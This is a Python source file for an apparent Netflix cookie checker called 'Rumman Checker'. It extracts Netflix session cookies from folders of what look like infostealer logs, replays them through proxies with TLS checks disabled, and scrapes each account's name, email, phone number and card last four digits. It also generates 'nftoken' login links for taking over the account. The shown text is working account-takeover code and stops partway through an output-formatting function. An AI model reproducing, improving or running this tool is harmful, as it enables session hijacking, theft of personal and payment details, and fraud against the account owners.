#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Rumman Checker - Netflix Cookie Checker
Final - Fixed CC vs DCB detection
"""

import os
import sys
import re
import json
import time
import random
import shutil
import threading
import tkinter as tk
from tkinter import filedialog
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Tuple, Optional, Dict, List, Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================================================
# CONSTANTS
# ==================================================

SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
COOKIES_FOLDER = os.path.join(SCRIPT_DIR, "Cookies")
PROCESSED_FOLDER = os.path.join(SCRIPT_DIR, "Processed")
OUTPUT_BASE_FOLDER = os.path.join(SCRIPT_DIR, "Output")
PROXY_FILE = os.path.join(SCRIPT_DIR, "proxy.txt")

DEBUG = False

MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
YOUR_ACCOUNT_URL = "https://www.netflix.com/YourAccount"

# ==================================================
# COLORS
# ==================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

if not sys.stdout.isatty():
    for attr in dir(Colors):
        if not attr.startswith('_'):
            setattr(Colors, attr, '')

def color_text(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"

# ==================================================
# BANNER
# ==================================================

BANNER = r"""
╦ ╦╔╦╗╔╦╗╦ ╦╔═╗╔╗╔╔═╗  ╔═╗╔═╗╔╦╗╔═╗╦═╗╔═╗╔╦╗
╠═╣ ║ ║║║╚╦╝║╣ ║║║╚═╗  ╚═╗║ ║ ║ ║╣ ╠╦╝╠═╣ ║ 
╩ ╩ ╩ ╩ ╩ ╩ ╚═╝╝╚╝╚═╝  ╚═╝╚═╝ ╩ ╚═╝╩╚═╩ ╩ ╩ 
                                                     
                    Netflix Cookie Checker - Rumman Edition
"""

# ==================================================
# UTILITIES
# ==================================================

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def set_title(title: str):
    try:
        if os.name == "nt":
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(f"Rumman Checker - {title}")
        else:
            sys.stdout.write(f"\033]0;Rumman Checker - {title}\007")
            sys.stdout.flush()
    except:
        pass

def create_folders():
    for folder in [COOKIES_FOLDER, PROCESSED_FOLDER, OUTPUT_BASE_FOLDER]:
        os.makedirs(folder, exist_ok=True)

def get_cookie_files() -> List[str]:
    if not os.path.exists(COOKIES_FOLDER):
        return []
    return [os.path.join(COOKIES_FOLDER, f) for f in os.listdir(COOKIES_FOLDER) 
            if f.lower().endswith(('.txt', '.json'))]

def get_timestamped_output_folder() -> str:
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    folder = os.path.join(OUTPUT_BASE_FOLDER, timestamp)
    os.makedirs(folder, exist_ok=True)
    dcb_folder = os.path.join(folder, "DCB")
    os.makedirs(dcb_folder, exist_ok=True)
    tp_folder = os.path.join(folder, "TP")
    os.makedirs(tp_folder, exist_ok=True)
    return folder

def decode_value(value: Any) -> Optional[str]:
    if value is None:
        return None
    cleaned = str(value)
    cleaned = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), cleaned)
    cleaned = cleaned.replace('\\/', '/').replace('\\"', '"').replace('\\n', ' ').replace('\\t', ' ')
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned if cleaned else None

def country_to_flag(code: str) -> str:
    if not code or len(code) != 2:
        return ""
    try:
        return "".join(chr(127397 + ord(c)) for c in code.upper())
    except:
        return ""

def get_payment_category(payment_method: str) -> str:
    """
    Categorize payment method:
    - CC: Credit/Debit cards (checked FIRST)
    - PayPal: PayPal
    - UPI: GPay, PhonePe, Paytm, etc.
    - DCB: Carrier billing, mobile wallets (GoPay, OVO, etc.)
    - Mobile wallet: Generic wallet (fallback)
    - TP: Third party (everything else)
    """
    pm = payment_method.lower()
    
    # CREDIT/DEBIT CARDS - Check FIRST so they don't get caught by DCB
    card_keywords = ['credit', 'debit', 'card', 'visa', 'mastercard', 'amex', 
                     'american express', 'discover', 'jcb', 'rupay', 'maestro',
                     'credit card', 'debit card']
    if any(kw in pm for kw in card_keywords) or pm in ('cc', 'creditcard', 'debitcard'):
        return "CC"
    
    # PayPal
    if 'paypal' in pm:
        return "PayPal"
    
    # UPI - includes GPay, PhonePe, Paytm, Google Pay, Amazon Pay
    upi_keywords = [
        'upi', 'google pay', 'gpay', 'phonepe', 'paytm', 'amazon pay', 
        'tez', 'googlepay', 'phone pay', 'paytm wallet', 'amazonpay'
    ]
    if any(kw in pm for kw in upi_keywords):
        return "UPI"
    
    # DCB: direct carrier billing, mobile wallets (carrier-based)
    dcb_keywords = [
        'dcb', 'direct carrier billing', 'carrier billing',
        'digi', 'maya', 'stcsa', 'stckw', 'turktelecom', 'vodafone', 'gopay', 'ovo',
        'shopeepay', 'playpl', 'kt', 'sfr', 'ais', 'true move', 'true move h',
        'ntt docomo', 'vodafoneeg', 'fet', 'etisalat', 'telkomsel', 'xl axiata', 'smartfren',
        'indosat', 'three', 't-mobile', 'orange', 'telekom', 'telenor', 'o2',
        'dtac', 'true', 'maxis', 'celcom', 'umi', 'pldt', 'globe', 'smart', 'jio', 'airtel',
        'vi', 'idea', 'banglalink', 'robi', 'grameenphone', 'telstra', 'optus', 'verizon',
        'at&t', 'sprint', 'tracfone', 'cricket', 'metro', 'boost', 'virgin', 'bell', 'rogers', 'telus'
    ]
    if any(kw in pm for kw in dcb_keywords):
        return "DCB"
    
    # Generic mobile wallet
    wallet_keywords = ['mobile wallet', 'wallet', 'ewallet', 'e-wallet']
    if any(kw in pm for kw in wallet_keywords):
        return "Mobile wallet"
    
    # Everything else
    return "TP"

def get_country_code(country: str) -> str:
    if not country:
        return "XX"
    if re.match(r'^[A-Z]{2}$', country.upper()):
        return country.upper()[:2]
    match = re.search(r'([A-Z]{2})', country.upper())
    return match.group(1) if match else "XX"

def sanitize_filename_part(text: str, max_len: int = 25) -> str:
    if not text:
        return "unknown"
    cleaned = re.sub(r'[^a-zA-Z0-9@._-]', '_', text.lower())
    cleaned = re.sub(r'_+', '_', cleaned)
    if len(cleaned) > max_len:
        cleaned = cleaned[:max_len]
    return cleaned.strip('_')

def clean_phone_number(phone: str) -> str:
    if not phone:
        return ""
    has_plus = phone.strip().startswith('+')
    digits = re.sub(r'\D', '', phone)
    if has_plus and digits:
        return f"+{digits}"
    return digits

# ==================================================
# COOKIE PARSING - SUPPORTS FORMATTED REPORTS
# ==================================================

def extract_cookies_from_formatted_report(content: str) -> List[Tuple[Dict[str, str], str, Dict[str, Any]]]:
    """Extract cookies from formatted report like the one shown."""
    bundles = []
    
    # Split by "🔹" or "----------------------------------------"
    blocks = re.split(r'\n-{40,}\n|\n🔹', content)
    
    for block in blocks:
        if not block.strip():
            continue
        
        # Extract NetflixId from 🍪 Cookie: line
        cookie_match = re.search(r'🍪 Cookie:\s*NetflixId=([^\s\n]+)', block)
        if not cookie_match:
            cookie_match = re.search(r'Cookie:\s*NetflixId=([^\s\n]+)', block)
        if not cookie_match:
            cookie_match = re.search(r'NetflixId=([^\s\n;]+)', block)
        
        if cookie_match:
            netflix_id_raw = cookie_match.group(1)
            netflix_id = netflix_id_raw
            if '%' in netflix_id:
                try:
                    from urllib.parse import unquote
                    netflix_id = unquote(netflix_id)
                except:
                    pass
            
            cookies = {'NetflixId': netflix_id}
            netscape = f".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t{netflix_id}"
            
            secure_match = re.search(r'SecureNetflixId=([^\s\n;]+)', block)
            if secure_match:
                secure_id = secure_match.group(1)
                if '%' in secure_id:
                    try:
                        from urllib.parse import unquote
                        secure_id = unquote(secure_id)
                    except:
                        pass
                cookies['SecureNetflixId'] = secure_id
                netscape += f"\n.netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t{secure_id}"
            
            account_info = {}
            
            name_match = re.search(r'👤 Name:\s*(.+?)(?:\n|$)', block)
            if name_match:
                account_info['accountOwnerName'] = name_match.group(1).strip()
            
            country_match = re.search(r'🌍 Country:\s*([^\s]+)\s*[🇦-🇿]', block)
            if not country_match:
                country_match = re.search(r'Country:\s*([^\s]+)', block)
            if country_match:
                account_info['countryOfSignup'] = country_match.group(1).strip()
            
            plan_match = re.search(r'📋 Plan:\s*(.+?)(?:\n|$)', block)
            if plan_match:
                account_info['plan'] = plan_match.group(1).strip()
            
            email_match = re.search(r'📧 Email:\s*([^\s\n]+)', block)
            if email_match:
                account_info['email'] = email_match.group(1).strip()
            
            member_match = re.search(r'📅 Member Since:\s*(.+?)(?:\n|$)', block)
            if member_match:
                account_info['memberSince'] = member_match.group(1).strip()
            
            billing_match = re.search(r'📅 Next Billing Date:\s*(.+?)(?:\n|$)', block)
            if billing_match:
                account_info['nextBillingDate'] = billing_match.group(1).strip()
            
            quality_match = re.search(r'🎥 Video Quality:\s*(.+?)(?:\n|$)', block)
            if quality_match:
                account_info['videoQuality'] = quality_match.group(1).strip()
            
            streams_match = re.search(r'📺 Max Streams:\s*(\d+)', block)
            if streams_match:
                account_info['maxStreams'] = streams_match.group(1)
            
            bundles.append((cookies, netscape, account_info))
    
    return bundles

def extract_cookie_bundles(content: str) -> List[Tuple[Dict[str, str], str, Dict[str, Any]]]:
    bundles = []
    
    report_bundles = extract_cookies_from_formatted_report(content)
    if report_bundles:
        return report_bundles
    
    try:
        data = json.loads(content)
        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            items = data.get('cookies', [data])
        else:
            items = []
        
        cookie_sets = {}
        for item in items:
            if isinstance(item, dict):
                name = item.get('name')
                value = item.get('value')
                if name and value:
                    idx = item.get('index', 0)
                    if idx not in cookie_sets:
                        cookie_sets[idx] = {}
                    cookie_sets[idx][name] = value
        
        for idx, cookies in cookie_sets.items():
            if 'NetflixId' in cookies:
                netscape_lines = []
                for name, value in cookies.items():
                    domain = '.netflix.com'
                    secure = 'TRUE' if name == 'SecureNetflixId' else 'FALSE'
                    netscape_lines.append(f"{domain}\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
                netscape_content = "\n".join(netscape_lines)
                bundles.append((cookies, netscape_content, {}))
    except:
        pass
    
    if not bundles:
        blocks = re.split(r'\n\s*\n', content.strip())
        for block in blocks:
            if not block.strip():
                continue
            cookies = {}
            netscape_lines = []
            for line in block.splitlines():
                line = line.strip()
                if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
                    continue
                if line.startswith('#HttpOnly_'):
                    line = line[10:]
                parts = line.split('\t')
                if len(parts) >= 7:
                    domain = parts[0]
                    name = parts[5]
                    value = parts[6]
                    if 'netflix' in domain.lower():
                        cookies[name] = value
                        netscape_lines.append(line)
            if 'NetflixId' in cookies:
                bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    if not bundles:
        cookies = {}
        netscape_lines = []
        patterns = {
            'NetflixId': r'NetflixId[=:"]+([^";\s]+)',
            'SecureNetflixId': r'SecureNetflixId[=:"]+([^";\s]+)',
            'nfvdid': r'nfvdid[=:"]+([^";\s]+)',
            'gsid': r'gsid[=:"]+([^";\s]+)',
        }
        for name, pattern in patterns.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                cookies[name] = match.group(1)
                netscape_lines.append(f".netflix.com\tTRUE\t/\t{name == 'SecureNetflixId'}\t0\t{name}\t{match.group(1)}")
        if 'NetflixId' in cookies:
            bundles.append((cookies, "\n".join(netscape_lines), {}))
    
    return bundles

# ==================================================
# ACCOUNT INFO EXTRACTION FROM NETFLIX
# ==================================================

def extract_account_info_from_netflix(html_content: str) -> Dict[str, Any]:
    info = {}
    
    def find(pattern, group=1):
        m = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
        return decode_value(m.group(group)) if m else None
    
    info['accountOwnerName'] = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"name":\s*"([^"]+)"')
    info['email'] = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"') or find(r'"loginId"\s*:\s*"([^"]+)"')
    info['countryOfSignup'] = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
    info['memberSince'] = find(r'"memberSince"\s*:\s*"([^"]+)"')
    info['nextBillingDate'] = find(r'"nextBillingDate"\s*:\s*"([^"]+)"')
    info['userGuid'] = find(r'"userGuid"\s*:\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')
    info['membershipStatus'] = find(r'"membershipStatus"\s*:\s*"([^"]+)"')
    info['videoQuality'] = find(r'"videoQuality"\s*:\s*"([^"]+)"')
    info['planPrice'] = find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"') or find(r'"displayPrice"\s*:\s*"([^"]+)"')
    
    last_charge_amount = find(r'"lastChargeAmount":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"')
    if not last_charge_amount:
        last_charge_amount = find(r'"lastChargeAmount":\s*"([^"]+)"')
    info['lastChargeAmount'] = last_charge_amount
    
    last_charge_date = find(r'"lastChargeDate":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"')
    if not last_charge_date:
        last_charge_date = find(r'"lastChargeDate":\s*"([^"]+)"')
    info['lastChargeDate'] = last_charge_date
    
    streams = find(r'"maxStreams":\s*\{\s*"fieldType":\s*"Numeric",\s*"value":\s*(\d+)')
    if not streams:
        streams = find(r'"maxStreams":\s*"?(\d+)"?')
    info['maxStreams'] = streams
    
    ev = re.search(r'"growthEmail".*?"isVerified":\s*(true|false)', html_content, re.DOTALL)
    if ev:
        info['emailVerified'] = "Yes" if ev.group(1) == "true" else "No"
    else:
        ev2 = re.search(r'"emailVerified":\s*(true|false)', html_content)
        info['emailVerified'] = "Yes" if (ev2 and ev2.group(1) == "true") else "No" if ev2 else "Yes" if info.get('email') else "No"
    
    plan = find(r'"localizedPlanName":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"')
    if not plan:
        plan = find(r'"localizedPlanName":\s*"([^"]+)"')
    if plan:
        plan_lower = plan.lower()
        if 'premium' in plan_lower:
            info['plan'] = 'Premium'
        elif 'standard_with_ads' in plan_lower:
            info['plan'] = 'Standard With Ads'
        elif 'standard' in plan_lower:
            info['plan'] = 'Standard'
        elif 'basic' in plan_lower:
            info['plan'] = 'Basic'
        elif 'mobile' in plan_lower:
            info['plan'] = 'Mobile'
        else:
            info['plan'] = plan
    else:
        streams_val = info.get('maxStreams')
        if streams_val:
            try:
                if int(streams_val) >= 4:
                    info['plan'] = 'Premium'
                elif int(streams_val) >= 2:
                    info['plan'] = 'Standard'
                else:
                    info['plan'] = 'Basic'
            except:
                info['plan'] = 'Unknown'
        else:
            info['plan'] = 'Unknown'
    
    payment_method = None
    last4 = None
    logo = find(r'"paymentOptionLogo":\s*"([^"]+)"')
    if logo:
        payment_method = logo
    display = find(r'"displayText":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"')
    if not display:
        display = find(r'"displayText":\s*"([^"]+)"')
    if display:
        digits = re.findall(r'\d+', display)
        if digits:
            last_digits = digits[-1]
            if len(last_digits) >= 4:
                last4 = last_digits[-4:]
        dl = display.lower()
        if 'paypal' in dl:
            payment_method = 'PayPal'
        elif 'gopay' in dl:
            payment_method = 'GoPay'
        elif 'dana' in dl:
            payment_method = 'DANA'
        elif 'ovo' in dl:
            payment_method = 'OVO'
        elif 'shopeepay' in dl:
            payment_method = 'ShopeePay'
        elif 'bri' in dl:
            payment_method = 'BRI'
        elif 'bca' in dl:
            payment_method = 'BCA'
        elif 'mandiri' in dl:
            payment_method = 'Mandiri'
        elif 'credit' in dl or 'card' in dl:
            payment_method = 'Credit Card'
        elif 'debit' in dl:
            payment_method = 'Debit Card'
        elif 'upi' in dl or 'google pay' in dl or 'phonepe' in dl or 'paytm' in dl or 'gpay' in dl:
            payment_method = 'UPI'
    if not payment_method:
        payment_method = find(r'"paymentMethodType":\s*"([^"]+)"') or "Unknown"
    info['paymentMethod'] = payment_method
    if last4:
        info['paymentLast4'] = last4
    
    phone = find(r'"phoneNumberDigits":\s*\{\s*[^}]*"value":\s*"([^"]+)"')
    if not phone:
        phone = find(r'"phoneNumber":\s*"([^"]+)"')
    if phone:
        info['phoneNumber'] = clean_phone_number(phone)
    
    pv = re.search(r'"phoneNumberDigits".*?"isVerified":\s*(true|false)', html_content, re.DOTALL)
    info['phoneVerified'] = "Yes" if (pv and pv.group(1) == "true") else "No"
    
    hold = re.search(r'"isUserOnHold":\s*(true|false)', html_content)
    info['holdStatus'] = "Yes" if (hold and hold.group(1) == "true") else "No"
    
    extra = re.search(r'"showExtraMemberSection":\s*(true|false)', html_content)
    info['extraMembers'] = "Yes" if (extra and extra.group(1) == "true") else "No"
    
    profiles = []
    prof_section = re.search(r'"profiles":\s*\[(.*?)\]', html_content, re.DOTALL)
    if prof_section:
        for name_match in re.finditer(r'"name":\s*"([^"]+)"', prof_section.group(1)):
            name = decode_value(name_match.group(1))
            if name and name not in profiles:
                profiles.append(name)
    if not profiles:
        for name_match in re.finditer(r'"name":\s*"([^"]+)".*?"__typename":\s*"Profile"', html_content):
            name = decode_value(name_match.group(1))
            if name and name not in profiles:
                profiles.append(name)
    if profiles:
        info['profiles'] = ", ".join(profiles)
        info['profileCount'] = len(profiles)
    
    info['is_subscribed'] = info.get('membershipStatus', '').upper() == 'CURRENT_MEMBER'
    return info

# ==================================================
# NETFLIX CHECKER
# ==================================================

def check_account(cookies: Dict[str, str], proxy: Optional[str] = None, timeout: int = 20) -> Tuple[bool, Dict[str, Any], str]:
    session = requests.Session()
    for name, value in cookies.items():
        session.cookies.set(name, value, domain='.netflix.com', path='/')
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    
    proxies = {}
    if proxy:
        proxies = {'http': proxy, 'https': proxy}
    
    try:
        resp = session.get(MEMBERSHIP_URL, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=True)
        if DEBUG:
            print(f"Membership status: {resp.status_code}, URL: {resp.url}")
        if resp.status_code == 200:
            info = extract_account_info_from_netflix(resp.text)
            if info.get('email'):
                return info.get('is_subscribed', False), info, resp.text
        
        resp2 = session.get(YOUR_ACCOUNT_URL, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=True)
        if DEBUG:
            print(f"YourAccount status: {resp2.status_code}")
        if resp2.status_code == 200:
            info = extract_account_info_from_netflix(resp2.text)
            if info.get('email'):
                return info.get('is_subscribed', False), info, resp2.text
        
        if 'login' in resp.url.lower() or 'signup' in resp.url.lower():
            return False, {}, "Redirected to login"
        return False, {}, f"HTTP {resp.status_code}"
    except requests.exceptions.Timeout:
        return False, {}, "Timeout"
    except requests.exceptions.ProxyError:
        return False, {}, "Proxy error"
    except Exception as e:
        return False, {}, str(e)[:50]

def load_proxies() -> List[str]:
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith('http'):
                        line = f'http://{line}'
                    proxies.append(line)
    return proxies

# ==================================================
# NFTOKEN
# ==================================================

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def create_nftoken(cookies: Dict[str, str]) -> Optional[Dict]:
    netflix_id = cookies.get('NetflixId')
    if not netflix_id:
        return None
    headers = dict(NFTOKEN_HEADERS)
    headers['Cookie'] = f'NetflixId={netflix_id}'
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
        if DEBUG:
            print(f"NFToken API status: {resp.status_code}")
        if resp.status_code == 200:
            data = resp.json()
            token_data = (((data.get('value') or {}).get('account') or {}).get('token') or {}).get('default') or {}
            token = token_data.get('token')
            if token:
                expires = datetime.now(timezone.utc) + timedelta(hours=1)
                return {
                    'token': token,
                    'expires_at_utc': expires.strftime("%Y-%m-%d %H:%M:%S UTC")
                }
    except Exception as e:
        if DEBUG:
            print(f"NFToken exception: {e}")
    return None

# ==================================================
# LOGS EXTRACTOR
# ==================================================

def parse_cookie_line_for_extract(line: str) -> Optional[Dict]:
    parts = line.strip().split('\t')
    if len(parts) >= 7:
        return {
            'domain': parts[0],
            'path': parts[2],
            'secure': parts[3] == 'TRUE',
            'name': parts[5],
            'value': parts[6]
        }
    return None

def extract_logs():
    print(color_text("\n[*] Logs Extractor - Select folder containing log files", Colors.CYAN))
    root = tk.Tk()
    root.withdraw()
    folder_path = filedialog.askdirectory(title="Select Logs Folder")
    root.destroy()
    if not folder_path:
        print(color_text("[!] No folder selected. Returning to menu.", Colors.YELLOW))
        time.sleep(1)
        return
    
    all_files = []
    for root_dir, dirs, files in os.walk(folder_path):
        for filename in files:
            if filename.lower().endswith('.txt'):
                all_files.append(os.path.join(root_dir, filename))
    
    if not all_files:
        print(color_text("[!] No .txt files found in selected folder", Colors.YELLOW))
        input("\nPress Enter to continue...")
        return
    
    total_files = len(all_files)
    print(color_text(f"\n[*] Scanning {total_files} files...", Colors.CYAN))
    
    cookie_lines_found = 0
    processed = 0
    lock = threading.Lock()
    
    def process_file(file_path):
        nonlocal cookie_lines_found, processed
        matching = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if 'netflix.com' not in line.lower():
                        continue
                    line_stripped = line.strip()
                    if not line_stripped:
                        continue
                    if line_stripped.startswith('#') and not line_stripped.startswith('#HttpOnly_'):
                        continue
                    cookie = parse_cookie_line_for_extract(line_stripped)
                    if cookie:
                        domain_lower = cookie['domain'].lower()
                        if domain_lower.startswith("#httponly_"):
                            domain_lower = domain_lower[10:]
                        if domain_lower.lstrip(".") == "netflix.com":
                            matching.append(line_stripped)
        except:
            pass
        
        with lock:
            processed += 1
            if matching:
                cookie_lines_found += 1
                safe_name = f"[NETFLIX]_{cookie_lines_found}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                out_path = os.path.join(COOKIES_FOLDER, safe_name)
                with open(out_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(matching) + "\n")
            sys.stdout.write(f"\r[*] Progress: {processed}/{total_files} | Found: {cookie_lines_found}")
            sys.stdout.flush()
    
    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = [ex.submit(process_file, fp) for fp in all_files]
        for f in as_completed(futures):
            try:
                f.result()
            except:
                pass
    
    sys.stdout.write("\n")
    print(color_text(f"\n[+] Extracted {cookie_lines_found} Netflix cookies to 'Cookies' folder", Colors.GREEN))
    input("\nPress Enter to continue...")

# ==================================================
# OUTPUT FORMATTING
# ==================================================

def format_output(info: Dict, cookie_content: str, nftoken: Optional[Dict] = None) -> str:
    lines = [
        "# Copyright by Rumman",
        "# Made By Rumman",
        "",
        "# ==================================================",
        "# ACCOUNT INFORMATION",
        "# ==================================================",
    ]
    
    plan = info.get('plan', 'Unknown')
    status_display = f"{plan} ✅" if info.get('is_subscribed') else "Free / No Subscription"
    lines.append(f"# Status: {status_display}")
    
    if info.get('accountOwnerName'):
        lines.append(f"# Name: {info['accountOwnerName']}")
    if info.get('email'):
        lines.append(f"# Email: {info['email']}")
    if info.get('emailVerified'):
        emoji = "✅" if info['emailVerified'] == "Yes" else "❌"
        lines.append(f"# Email Verified: {info['emailVerified']} {emoji}")
    
    country = info.get('countryOfSignup', 'Unknown')
    flag = country_to_flag(country)
    lines.append(f"# Country: {country} {flag}")
    lines.append(f"# Plan: {plan}")
    
    if info.get('planPrice'):
        lines.append(f"# Price: {info['planPrice']}")
    
    if info.get('lastChargeAmount'):
        lines.append(f"# Last Charge Amount: {info['lastChargeAmount']}")
    if info.get('lastChargeDate'):
        lines.append(f"# Last Charge Date: {info['lastChargeDate']}")
    
    pay_method = info.get('paymentMethod', 'Unknown')
    last4 = info.get('paymentLast4', '')
    if last4:
        lines.append(f"# Payment Method: {pay_method} •••• {last4}")
        lines.append(f"# Last 4 Digits: {last4}")
    else:
        lines.append(f"# Payment Method: {pay_method}")
    
    if info.get('phoneNumber'):
        lines.append(f"# Phone Number: {info['phoneNumber']}")
    if info.get('phoneVerified'):
        emoji = "✅" if info['phoneVerified'] == "Yes" else "❌"
        lines.append(f"# Phone Verified: {info['phoneVerified']} {emoji}")
    
    if info.get('memberSince'):
        lines.append(f"# Member Since: {info['memberSince']}")
    if info.get('nextBillingDate'):
        lines.append(f"# Next Billing: {info['nextBillingDate']}")
    
    hold = info.get('holdStatus', 'No')
    hold_emoji = "❌" if hold == "No" else "⚠️"
    lines.append(f"# Hold Status: {hold} {hold_emoji}")
    
    if info.get('videoQuality'):
        lines.append(f"# Quality: {info['videoQuality']}")
    if info.get('maxStreams'):
        lines.append(f"# Streams: {info['maxStreams']}")
    
    extra = info.get('extraMembers', 'No')
    extra_emoji = "✅" if extra == "Yes" else "❌"
    lines.append(f"# Extra Members: {extra} {extra_emoji}")
    
    if info.get('membershipStatus'):
        lines.append(f"# Membership Status: {info['membershipStatus']}")
    
    if info.get('profiles'):
        lines.append(f"# Profiles: {info['profiles']}")
    elif info.get('profileCount'):
        lines.append(f"# Profiles: {info['profileCount']} profiles")
    
    if info.get('userGuid'):
        lines.append(f"# User GUID: {info['userGuid']}")
    
    if nftoken:
        lines.extend([
            "",
            "# ==================================================",
            "# NFTOKEN DETAILS",
            "# ==================================================",
            f"# NFToken: {nftoken['token']}",
            f"# PC Login: https://netflix.com/?nftoken={nftoken['token']}",
            f"# Phone Login: https://netflix.com/unsupported?nftoken={nftoken['token']}",
            f"# Valid Till: {nftoken['expires_at_utc']}",
        ])
    
    lines.extend([
        "",
        "# ==================================================",
        "# COOKIE DATA (Netscape Format)",
        "# ==================================================",
        cookie_content.strip(),
